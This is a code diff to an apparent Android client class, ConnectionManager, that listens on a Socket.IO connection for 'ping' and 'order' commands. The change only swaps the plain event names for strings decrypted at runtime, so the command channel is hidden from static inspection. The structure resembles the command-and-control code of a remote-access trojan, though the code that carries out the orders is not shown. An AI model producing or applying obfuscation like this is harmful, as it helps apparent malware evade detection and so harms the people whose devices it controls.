@@ -78,17 +78,21 @@ public class ConnectionManager {
 
             ioSocket = IOSocket.getInstance().getIoSocket();
 
+            // Resolve encrypted Socket.IO event names at runtime
+            final String pingEvent = ObfuscationUtils.decrypt(ObfuscationUtils.ENC_PING);
+            final String pongEvent = ObfuscationUtils.decrypt(ObfuscationUtils.ENC_PONG);
+            final String orderEvent = ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER);
 
-            ioSocket.on("ping", new Emitter.Listener() {
+            ioSocket.on(pingEvent, new Emitter.Listener() {
                 @Override
                 public void call(Object... args) {
                     if (ioSocket != null) {
-                        ioSocket.emit("pong");
+                        ioSocket.emit(pongEvent);
                     }
                 }
             });
 
-            ioSocket.on("order", new Emitter.Listener() {
+            ioSocket.on(orderEvent, new Emitter.Listener() {
                 @Override
                 public void call(Object... args) {
                     try {
